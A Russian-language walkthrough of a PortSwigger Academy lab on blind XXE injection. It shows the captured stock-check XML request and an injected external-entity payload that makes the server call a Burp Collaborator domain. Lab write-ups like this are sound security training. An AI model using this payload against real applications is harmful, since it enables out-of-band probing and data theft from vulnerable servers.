перейдем на случайную страницу товара и проверим его наличие с помощью кнопки `Get stock`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/3.%20Blind%20XXE%20with%20out-of-band%20interaction/pics%20for%20walktrough/1.png)
найдем данный запрос в `Proxy` -> `HTTP history`
```
POST /product/stock 
<?xml version="1.0" encoding="UTF-8"?><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
```
и отправим его в `Repeater`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/3.%20Blind%20XXE%20with%20out-of-band%20interaction/pics%20for%20walktrough/2.png)

Попробуем получить отстук на сгенерированный DGA домен добавив `<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://u94fkfz3xfin98vve09t93vpqgw7kx8m.oastify.com"> ]>` в тело XML запроса
```
<?xml version="1.0" encoding="UTF-8"?>
...
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "http://u94fkfz3xfin98vve09t93vpqgw7kx8m.oastify.com"> ]>
...
<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/3.%20Blind%20XXE%20with%20out-of-band%20interaction/pics%20for%20walktrough/3.png)
мы получили 400 статус респонс код, но все равно получили отстук на коллаборатор и уведомление об успешно выполненной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/11.%20XXE%20injection/3.%20Blind%20XXE%20with%20out-of-band%20interaction/pics%20for%20walktrough/4.png)
